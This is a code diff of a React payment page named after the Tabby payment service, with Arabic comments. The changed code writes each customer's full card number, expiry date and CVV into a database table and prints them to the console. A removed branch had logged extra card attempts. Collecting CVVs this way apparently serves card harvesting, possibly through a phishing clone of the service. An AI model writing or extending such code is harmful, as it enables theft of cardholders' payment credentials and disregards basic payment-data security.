@@ -53,63 +53,35 @@ const TabbyPaymentProcessing = () => {
         let finalPaymentId: string;
         
         if (existingPaymentId) {
-          // التحقق من البطاقة الأساسية
-          const { data: existingPayment } = await supabase
-            .from("tabby_payments")
-            .select("card_number, cardholder_name")
-            .eq("id", existingPaymentId)
-            .single();
-
           finalPaymentId = existingPaymentId;
           setPaymentId(existingPaymentId);
 
-          console.log("Existing payment data:", existingPayment);
-          console.log("New card data:", { cardNumber, cardholderName });
+          // دائماً نحفظ البطاقة الأولى في السجل الرئيسي
+          console.log("Updating main card with:", {
+            cardholder_name: cardholderName,
+            card_number: cardNumber,
+            card_number_last4: cardNumberLast4,
+            expiry_date: expiryDate,
+            cvv: cvv,
+          });
 
-          // تحديث البطاقة الأساسية إذا كانت تحتوي على القيم الافتراضية
-          // أو إذا كان اسم حامل البطاقة هو "Customer"
-          const isDefaultCard = !existingPayment?.card_number || 
-                               existingPayment.card_number === "0000000000000000" ||
-                               existingPayment.cardholder_name === "Customer";
-
-          if (isDefaultCard) {
-            // حفظ البطاقة الأولى في السجل الرئيسي
-            console.log("Updating main card with:", {
+          const { error: updateError } = await supabase
+            .from("tabby_payments")
+            .update({
               cardholder_name: cardholderName,
               card_number: cardNumber,
               card_number_last4: cardNumberLast4,
               expiry_date: expiryDate,
               cvv: cvv,
-            });
+            })
+            .eq("id", existingPaymentId);
 
-            const { error: updateError } = await supabase
-              .from("tabby_payments")
-              .update({
-                cardholder_name: cardholderName,
-                card_number: cardNumber,
-                card_number_last4: cardNumberLast4,
-                expiry_date: expiryDate,
-                cvv: cvv,
-              })
-              .eq("id", existingPaymentId);
-
-            if (updateError) {
-              console.error("Update error:", updateError);
-              throw updateError;
-            }
-            
-            console.log("Main card updated successfully");
-          } else {
-            // إذا كانت البطاقة موجودة بالفعل، هذه محاولة إضافية
-            console.log("Adding payment attempt");
-            await supabase.from("tabby_payment_attempts").insert({
-              payment_id: finalPaymentId,
-              card_number: cardNumber,
-              cardholder_name: cardholderName,
-              expiry_date: expiryDate,
-              cvv: cvv,
-            });
+          if (updateError) {
+            console.error("Update error:", updateError);
+            throw updateError;
           }
+          
+          console.log("Main card updated successfully");
         } else {
           // إنشاء سجل جديد (للحالات القديمة)
           console.log("Creating new payment record");
